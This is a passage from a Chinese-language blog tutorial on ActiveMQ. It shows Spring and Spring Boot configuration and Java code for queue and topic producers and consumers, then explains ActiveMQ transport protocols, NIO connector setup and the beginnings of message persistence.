&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans 
       http://www.springframework.org/schema/beans/spring-beans.xsd 
       http://www.springframework.org/schema/context 
       https://www.springframework.org/schema/context/spring-context.xsd&quot;&amp;gt;

    &amp;lt;!--  开启包的自动扫描  --&amp;gt;
    &amp;lt;context:component-scan base-package=&quot;com.polaris&quot;/&amp;gt;
    
    &amp;lt;!--  配置生产者  --&amp;gt;
    &amp;lt;bean id=&quot;connectionFactory&quot; 
          class=&quot;org.apache.activemq.pool.PooledConnectionFactory&quot; 
          destroy-method=&quot;stop&quot;&amp;gt;
        &amp;lt;property name=&quot;connectionFactory&quot;&amp;gt;
            &amp;lt;!--  真正可以生产Connection的ConnectionFactory,由对应的JMS服务商提供  --&amp;gt;
            &amp;lt;bean class=&quot;org.apache.activemq.spring.ActiveMQConnectionFactory&quot;&amp;gt;
                &amp;lt;property name=&quot;brokerURL&quot; value=&quot;tcp://mpolaris.top:61616&quot;/&amp;gt;
            &amp;lt;/bean&amp;gt;
        &amp;lt;/property&amp;gt;
        &amp;lt;property name=&quot;maxConnections&quot; value=&quot;100&quot;/&amp;gt;
    &amp;lt;/bean&amp;gt;

    &amp;lt;!--  这个是队列目的地,点对点的Queue  --&amp;gt;
    &amp;lt;bean id=&quot;destinationQueue&quot; class=&quot;org.apache.activemq.command.ActiveMQQueue&quot;&amp;gt;
        &amp;lt;!--    通过构造注入Queue名    --&amp;gt;
        &amp;lt;constructor-arg index=&quot;0&quot; value=&quot;spring-active-queue&quot;/&amp;gt;
    &amp;lt;/bean&amp;gt;

    &amp;lt;!--  这个是主题目的地,  发布订阅的主题Topic--&amp;gt;
    &amp;lt;bean id=&quot;destinationTopic&quot; class=&quot;org.apache.activemq.command.ActiveMQTopic&quot;&amp;gt;
        &amp;lt;constructor-arg index=&quot;0&quot; value=&quot;spring-active-topic&quot;/&amp;gt;
    &amp;lt;/bean&amp;gt;

    &amp;lt;!--  Spring提供的JMS工具类,他可以进行消息发送,接收等  --&amp;gt;
    &amp;lt;bean id=&quot;jmsTemplate&quot; class=&quot;org.springframework.jms.core.JmsTemplate&quot;&amp;gt;
        &amp;lt;!--    传入连接工厂    --&amp;gt;
        &amp;lt;property name=&quot;connectionFactory&quot; ref=&quot;connectionFactory&quot;/&amp;gt;
        &amp;lt;!--    传入目的地    --&amp;gt;
        &amp;lt;property name=&quot;defaultDestination&quot; ref=&quot;destinationQueue&quot;/&amp;gt;
        &amp;lt;!--    消息自动转换器    --&amp;gt;
        &amp;lt;property name=&quot;messageConverter&quot;&amp;gt;
            &amp;lt;bean class=&quot;org.springframework.jms.support.converter.SimpleMessageConverter&quot;/&amp;gt;
        &amp;lt;/property&amp;gt;
    &amp;lt;/bean&amp;gt;
&amp;lt;/beans&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;队列生产者&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Service
public class JmsProduce {
    @Autowired
    private JmsTemplate jmsTemplate;

    public static void main(String[] args) {
        ApplicationContext ioc = new ClassPathXmlApplicationContext(&quot;spring-activemq.xml&quot;);
        JmsProduce produce = (JmsProduce) ioc.getBean(&quot;jmsProduce&quot;);

        produce.jmsTemplate.send(new MessageCreator() {
            @Override
            public Message createMessage(Session session) throws JMSException {
                TextMessage message = session.createTextMessage(&quot;====&amp;gt; Spring和ActiveMQ的整合情况&quot;);
                return message;
            }
        });

        System.out.println(&quot;Send task over!&quot;);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;队列消费者&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Service
public class JmsConsumer {
    @Autowired
    private JmsTemplate jmsTemplate;

    public static void main(String[] args) {
        ApplicationContext ioc = new ClassPathXmlApplicationContext(&quot;spring-activemq.xml&quot;);
        JmsConsumer consumer = (JmsConsumer) ioc.getBean(&quot;jmsConsumer&quot;);

        String value = (String) consumer.jmsTemplate.receiveAndConvert();
        System.out.println(value);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;主题生产者和消费者&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;只需要修改配置文件目的地即可&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;!--  Spring提供的JMS工具类,他可以进行消息发送,接收等  --&amp;gt;
    &amp;lt;bean id=&quot;jmsTemplate&quot; class=&quot;org.springframework.jms.core.JmsTemplate&quot;&amp;gt;
        &amp;lt;!--    传入连接工厂    --&amp;gt;
        &amp;lt;property name=&quot;connectionFactory&quot; ref=&quot;connectionFactory&quot;/&amp;gt;
        &amp;lt;!--    传入目的地    --&amp;gt;
        &amp;lt;property name=&quot;defaultDestination&quot; ref=&quot;destinationTopic&quot;/&amp;gt;
        &amp;lt;!--    消息自动转换器    --&amp;gt;
        &amp;lt;property name=&quot;messageConverter&quot;&amp;gt;
            &amp;lt;bean class=&quot;org.springframework.jms.support.converter.SimpleMessageConverter&quot;/&amp;gt;
        &amp;lt;/property&amp;gt;
    &amp;lt;/bean&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;配置消费者的监听类&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;写了一个类来实现消息监听后，只需要启动生产者，消费者不需要启动就自动会监听记录！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;!-- 配置监听程序 --&amp;gt;
&amp;lt;bean id=&quot;jmsContainer&quot;
      class=&quot;org.springframework.jms.listener.DefaultMessageListenerContainer&quot;&amp;gt;
    &amp;lt;property name=&quot;connectionFactory&quot; ref=&quot;connectionFactory&quot;/&amp;gt;
    &amp;lt;property name=&quot;destination&quot; ref=&quot;destinationTopic&quot;/&amp;gt;
&amp;lt;/bean&amp;gt;

&amp;lt;bean id=&quot;myMessageListener&quot; class=&quot;com.polaris.queue.MyMessageListener&quot;&amp;gt;
&amp;lt;/bean&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Component
public class MyMessageListener implements MessageListener {
    @Override
    public void onMessage(Message message) {
        if(null != message &amp;amp;&amp;amp; message instanceof TextMessage) {
            TextMessage textMessage = (TextMessage) message;
            try {
                System.out.println(textMessage.getText());
            } catch (JMSException e) {
                e.printStackTrace();
            }
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;6-springboot整合activemq&quot;&gt;6. SpringBoot整合ActiveMQ&lt;/h4&gt;
&lt;p&gt;个人不太赞成使用这种方式SpringBoot整合ActiveMQ，因为这样做会失去原生代码的部分功能和灵活性。但是工作中这种方式做能够满足我们常见的需求，也方便和简化我们的代码，也为了适应工作中大家的习惯。&lt;/p&gt;
&lt;h5 id=&quot;61-队列案例---生产者点击投递&quot;&gt;6.1 队列案例 - 生产者点击投递&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;pom.xml文件&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
    &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;

    &amp;lt;parent&amp;gt;
        &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
        &amp;lt;artifactId&amp;gt;spring-boot-starter-parent&amp;lt;/artifactId&amp;gt;
        &amp;lt;version&amp;gt;2.4.2&amp;lt;/version&amp;gt;
        &amp;lt;relativePath/&amp;gt;
    &amp;lt;/parent&amp;gt;

    &amp;lt;groupId&amp;gt;com.polaris&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;springboot-activemq&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;0.0.1-SNAPSHOT&amp;lt;/version&amp;gt;

    &amp;lt;properties&amp;gt;
        &amp;lt;project.build.sourceEncoding&amp;gt;UTF-8&amp;lt;/project.build.sourceEncoding&amp;gt;
        &amp;lt;maven.compiler.source&amp;gt;1.8&amp;lt;/maven.compiler.source&amp;gt;
        &amp;lt;maven.compiler.target&amp;gt;1.8&amp;lt;/maven.compiler.target&amp;gt;
    &amp;lt;/properties&amp;gt;

    &amp;lt;dependencies&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-starter-activemq&amp;lt;/artifactId&amp;gt;
            &amp;lt;version&amp;gt;2.1.5.RELEASE&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-starter-test&amp;lt;/artifactId&amp;gt;
            &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;junit&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;junit&amp;lt;/artifactId&amp;gt;
            &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
        &amp;lt;/dependency&amp;gt;
    &amp;lt;/dependencies&amp;gt;

    &amp;lt;build&amp;gt;
        &amp;lt;plugins&amp;gt;
            &amp;lt;plugin&amp;gt;
                &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;spring-boot-maven-plugin&amp;lt;/artifactId&amp;gt;
            &amp;lt;/plugin&amp;gt;
        &amp;lt;/plugins&amp;gt;
    &amp;lt;/build&amp;gt;

&amp;lt;/project&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;application.yml&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-yml&quot;&gt;# web占用的端口
server:
  port: 8085

spring:
  activemq:
    # activemq的broker的url
    broker-url: tcp://mpolaris.top:61616
    # 连接activemq的broker所需的账号和密码
    user: admin
    password: admin
  jms:
    # 目的地是queue还是topic， false（默认）=queue    true=topic
    pub-sub-domain: false

# 自定义队列名称,这只是个常量
myqueue: boot-activemq-queue
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ActiveMQ配置类&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Configuration
@EnableJms   //开启Jms适配的注解
public class ConfigBean {

    @Value(&quot;${myqueue}&quot;)
    private String myQueue;

    //注入目的地
    @Bean
    public Queue queue() {
        return new ActiveMQQueue(myQueue);
    }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;队列消息生产者&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Component
public class QueueProduce {
    @Autowired
    private JmsMessagingTemplate jmsMessagingTemplate;

    @Autowired
    private Queue queue;

    public void produceMsg() {
        jmsMessagingTemplate.convertAndSend(queue,&quot;===&amp;gt; SpringBoot + ActiveMQ消息&quot;);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;测试类&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@SpringBootTest(classes = Application.class)
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
public class TestActiveMQ {
    @Resource   //这个是java 的注解，而Autowried是spring 的
    private QueueProduce produce;

    @Test
    public void testSend() {
        produce.produceMsg();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;62--队列案例---生产者间隔定投&quot;&gt;6.2 队列案例 - 生产者间隔定投&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;QueueProduce新增定时投递方法&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;/**
 * 间隔3秒定时投送
 */
@Scheduled(fixedDelay = 3000)
public void produceMsgScheduled() {
        jmsMessagingTemplate.convertAndSend(queue,&quot;定时投送 =&amp;gt; &quot;
                + UUID.randomUUID().toString().substring(0,6));
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;主启动类添加一个注解&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@SpringBootApplication
@EnableScheduling      //允许开启定时投送功能
public class Application {
    public static void main(String[] args) {
        SpringApplication.run(Application.class,args);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;直接开启主启动类，间隔投递消息&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&quot;63-队列案例---消费者监听&quot;&gt;6.3 队列案例 - 消费者监听&lt;/h5&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Component
public class QueueCustomer {
    @JmsListener(destination = &quot;${myqueue}&quot;)
    public void receive(TextMessage message) throws JMSException {
        System.out.println(&quot;消费者收到消息 =&amp;gt; &quot; + message.getText());
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;64-主题基本案例&quot;&gt;6.4 主题基本案例&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;application.yml配置文件&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-yml&quot;&gt;server:
  port: 6666

spring:
  activemq:
    broker-url: tcp://mpolaris.top:61616
    user: admin
    password: admin
  jms:
    # 目的地是queue还是topic， false（默认）=queue    true=topic
    pub-sub-domain: true
 
mytopic: boot-activemq-topic
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ActiveMQ配置文件&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Configuration
@EnableJms      //开启Jms适配的注解
public class ConfigBean {

    @Value(&quot;${mytopic}&quot;)
    private String myTopic;

    @Bean
    public Topic topic() {
        return new ActiveMQTopic(myTopic);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;主题生产者&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Component
public class TopicProduce {
    @Autowired
    private JmsMessagingTemplate jmsMessagingTemplate;

    @Autowired
    private Topic topic;

    public void produceMsg() {
        jmsMessagingTemplate.convertAndSend(topic,&quot;===&amp;gt; SpringBoot + ActiveMQ消息&quot;);
    }

    @Scheduled(fixedDelay = 3000)
    public void produceMsgScheduled() {
        jmsMessagingTemplate.convertAndSend(topic,&quot;定时投送 =&amp;gt; &quot;
                + UUID.randomUUID().toString().substring(0,6));
        System.out.println(&quot;定时投送&quot;);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;主题消费者&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Component
public class QueueCustomer {
    @JmsListener(destination = &quot;${mytopic}&quot;)
    public void receive(TextMessage message) throws JMSException {
        System.out.println(&quot;消费者收到消息 =&amp;gt; &quot; + message.getText());
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;7-activemq传输协议&quot;&gt;7. ActiveMQ传输协议&lt;/h4&gt;
&lt;h5 id=&quot;71-简介&quot;&gt;7.1 简介&lt;/h5&gt;
&lt;p&gt;ActiveMQ支持的client-broker通讯协议有：TCP、NIO、UDP、SSL、Http(s)、VM等。其中配置Transport Connector的文件在ActiveMQ安装目录的&lt;code&gt;conf/activemq.xml&lt;/code&gt;中的标签之内。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210117000034.png&quot; alt=&quot;image-20210117000034185&quot;/&gt;&lt;blockquote readability=&quot;2.2352941176471&quot;&gt;
&lt;p&gt;activemq传输协议的官方文档：&lt;a href=&quot;http://activemq.apache.org/configuring-version-5-transports.html&quot; target=&quot;_blank&quot;&gt;http://activemq.apache.org/configuring-version-5-transports.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210116235511.png&quot; alt=&quot;image-20210116235502513&quot;/&gt;&lt;p&gt;除了tcp和nio协议其他的了解就行。各种协议有各自擅长该协议的中间件，工作中一般不会使用activemq去实现这些协议。如： mqtt是物联网专用协议，采用的中间件一般是mosquito。ws是websocket的协议，是和前端对接常用的，一般在java代码中内嵌一个基站（中间件）。stomp好像是邮箱使用的协议的，各大邮箱公司都有基站（中间件）。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;注意：协议不同，我们的代码都会不同。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;72-各协议理解&quot;&gt;7.2 各协议理解&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;TCP协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Transmission Control Protocol(TCP)是默认的，TCP的Client监听端口61616&lt;/p&gt;
&lt;p&gt;在网络传输数据前必须要先序列化数据，消息是通过一个叫&lt;code&gt;wire protocol&lt;/code&gt;的来序列化成字节流。默认情况下ActiveMQ把&lt;code&gt;wrie protocol&lt;/code&gt; 叫做 OpenWire，它的目的就是促使网络上的效率更高和数据快速交换。&lt;/p&gt;
&lt;p&gt;TCP连接的URI形式如：&lt;code&gt;tcp://HostName:port?key=value&amp;amp;key=value&lt;/code&gt;，后面的参数是可选的。&lt;/p&gt;
&lt;p&gt;TCP传输的的优点：&lt;/p&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;TCP协议传输可靠性高，稳定性强&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;高效率：字节流方式传递，效率很高&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;有效性、可用性：应用广泛，支持任何平台&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;关于Transport协议的可选配置参数可以参考官网http://activemq.apache.org/tcp-transport-reference&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;NIO协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;New I/O API Protocol（NIO）。NIO协议和TCP协议类似，但NIO更侧重于底层的访问操作。它允许开发人员对同一资源可有更多的client调用和服务器端有更多的负载。&lt;/p&gt;
&lt;p&gt;适合使用NIO协议的场景：&lt;/p&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;可能有大量的Client去连接到Broker上，一般情况下大量的Client去连接Broker是被操作系统的线程所限制的。因此NIO的实现比TCP需要更少的线程去运行，所以建议使用NIO协议。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;可能对于Broker有一个很迟钝的网络传输，NIO比TCP提供更好的性能。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;NIO连接的URI形式：&lt;code&gt;nio://hostname:port?key=value&amp;amp;key=value&lt;/code&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;关于Transport协议的可选配置参数可以参考官网http://activemq.apache.org/configuring-version-5-transports.html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210117002050.png&quot; alt=&quot;图片1&quot;/&gt;&lt;p&gt;&lt;strong&gt;AMQP协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Advanced Message Queuing Protocol，一个提供统一消息服务的应用层标准高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端，中间件，不同产品，不同开发语言等条件限制。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;STOMP协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;STOP，Streaming Text Orientation Message Protocol，是流文本定向消息协议，是一种为MOM(Message Oriented Middleware，面向消息中间件)设计的简单文本协议。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MQTT协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;MQTT(Message Queuing Telemetry Transport，消息队列遥测传输)是IBM开发的一个即时通讯协议，有可能成为物联网的重要组成部分。该协议支持所有平台，几乎可以把所有联网物品和外部连接起来，被用来当作传感器和致动器(比如通过Twitter让房屋联网)的通信协议。&lt;/p&gt;
&lt;blockquote readability=&quot;2.1527777777778&quot;&gt;
&lt;p&gt;GitLub查看MQTT示例代码：&lt;a href=&quot;https://github.com/fusesource/mqtt-client&quot; target=&quot;_blank&quot;&gt;https://github.com/fusesource/mqtt-client&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;73-nio协议案例&quot;&gt;7.3 NIO协议案例&lt;/h5&gt;
&lt;p&gt;ActiveMQ这些协议传输的底层默认都是使用BIO网络的IO模型。只有当我们指定使用nio才使用NIO的IO模型。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NIO网络IO模型简单配置&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;修改配置文件activemq.xml&lt;/p&gt;
&lt;p&gt;如果你 &lt;span&gt;不特别指定ActiveMQ的网络监听端口，那么这些端口都将使用BIO网络IO模型&lt;/span&gt;，所以为了首先提高单节点的网络吞吐性能，我们需要明确指定ActiveMQ网络IO模型。如下所示：URI格式头以“nio”开头，表示这个端口使用以TCP协议为基础的NIO网络IO模型。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;transportConnectors&amp;gt;   
    &amp;lt;!-- 新增NIO协议 --&amp;gt;
        &amp;lt;transportConnector name=&quot;nio&quot; uri=&quot;nio://0.0.0.0:61618?trace=true&quot; /&amp;gt;&amp;lt;/transportConnectors&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;SpringBoot修改端口即可&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-yml&quot;&gt;server:
  port: 6666

spring:
  activemq:
    broker-url: nio://mpolaris.top:61618
    user: admin
    password: admin
  jms:
    pub-sub-domain: true
mytopic: boot-activemq-topic
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;NIO增强&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210117230317.png&quot; alt=&quot;image-20210117230310659&quot;/&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210117232434.png&quot; alt=&quot;image-20210117232434530&quot;/&gt;&lt;p&gt;修改activemq.xml配置文件（其实只要auto+nio一条都行了）&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;auto： 针对所有的协议，他会识别我们是什么协议。&lt;/p&gt;
&lt;p&gt;nio：使用NIO网络IO模型&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;transportConnectors&amp;gt;
        &amp;lt;transportConnector name=&quot;openwire&quot; uri=&quot;tcp://0.0.0.0:61626?maximumConnections=1000&amp;amp;amp;wireFormat.maxFrameSize=104857600&quot;/&amp;gt;
        &amp;lt;transportConnector name=&quot;amqp&quot; uri=&quot;amqp://0.0.0.0:5682?maximumConnections=1000&amp;amp;amp;wireFormat.maxFrameSize=104857600&quot;/&amp;gt;
        &amp;lt;transportConnector name=&quot;stomp&quot; uri=&quot;stomp://0.0.0.0:61623?maximumConnections=1000&amp;amp;amp;wireFormat.maxFrameSize=104857600&quot;/&amp;gt;
        &amp;lt;transportConnector name=&quot;mqtt&quot; uri=&quot;mqtt://0.0.0.0:1893?maximumConnections=1000&amp;amp;amp;wireFormat.maxFrameSize=104857600&quot;/&amp;gt;
        &amp;lt;transportConnector name=&quot;ws&quot; uri=&quot;ws://0.0.0.0:61624?maximumConnections=1000&amp;amp;amp;wireFormat.maxFrameSize=104857600&quot;/&amp;gt;
        &amp;lt;transportConnector name=&quot;nio&quot; uri=&quot;nio://0.0.0.0:61618?trace=true&quot; /&amp;gt;
        &amp;lt;transportConnector name=&quot;auto+nio&quot; uri=&quot;auto+nio://0.0.0.0:61608?maximumConnections=1000&amp;amp;amp;wireFormat.maxFrameSize=104857600&amp;amp;amp;org.apache.activemq.transport.nio.SelectorManager.corePoolSize=20&amp;amp;amp;org.apache.activemq.transport.nio.Se1ectorManager.maximumPoo1Size=50&quot;/&amp;gt;
&amp;lt;/transportConnectors&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;修改端口号为61608即可&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-yml&quot;&gt;server:
  port: 6666

spring:
  activemq:
    # broker-url: tcp://mpolaris.top:61608  适配多种协议（注意有些协议代码不一样）
    broker-url: nio://mpolaris.top:61608
    user: admin
    password: admin
  jms:
    pub-sub-domain: true
mytopic: boot-activemq-topic
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;8-activemq的消息存储和持久化&quot;&gt;8. ActiveMQ的消息存储和持久化&lt;/h4&gt;
&lt;h5 id=&quot;81-理解&quot;&gt;8.1 理解&lt;/h5&gt;
&lt;p&gt;此处持久化和之前持久性的区别&lt;/p&gt;
&lt;p&gt;MQ高可用：事务、持久性、签收，是属于MQ自身特性，自带的。这里的持久化是外力，是外部插件。之前讲的持久性是MQ的外在表现，现在讲的的持久是是底层实现。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210117233600.png&quot; alt=&quot;image-20210117233600172&quot;/&gt;&lt;h5 id=&quot;82-持久化是什么&quot;&gt;8.2 持久化是什么&lt;/h5&gt;
&lt;p&gt;官网文档：&lt;a href=&quot;http://activemq.apache.org/persistence&quot; target=&quot;_blank&quot;&gt;http://activemq.apache.org/persistence&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;持久化是什么？一句话就是：ActiveMQ宕机了消息不会丢失的机制。&lt;/p&gt;
&lt;p&gt;说明：为了避免意外宕机以后丢失信息，需要做到重启后可以恢复消息队列，消息系统一般都会&lt;span&gt;采用持久化机制&lt;/span&gt;。ActiveMQ的消息持久化机制有JDBC，AMQ，KahaDB和LevelDB，无论使用哪种持久化方式，消息的存储逻辑都是一致的。就是在发送者将消息发送出去后，消息中心首先将消息存储到本地数据文件、内存数据库或者远程数据库等。再试图将消息发给接收者，成功则将消息从存储中删除，失败则继续尝试发送。消息中心启动以后，要先检查指定的存储位置是否有未成功发送的消息，如果有则会先把存储位置中的消息发出去。&lt;/p&gt;
&lt;h5 id=&quot;83-mq持久化机制有哪些&quot;&gt;8.3 MQ持久化机制有哪些&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;AMQ Message Store&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;基于文件的存储机制，是以前的默认机制，现在不再使用。AMQ是一种文件存储形式，它具有写入速度快和容易恢复的特点。消息存储在一个个文件中，文件的默认大小为32M，当一个文件中的消息已经全部被消费，那么这个文件将被标识为可删除，在下一个清除阶段这个文件会被删除。AMQ适用于ActiveMQ5.3之前的版本。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;KahaDB&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;基于日志文件，从ActiveMQ5.4（含）开始默认的持久化，下面我们详细介绍。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LevelDB消息存储&lt;/strong&gt;&lt;/p&gt;
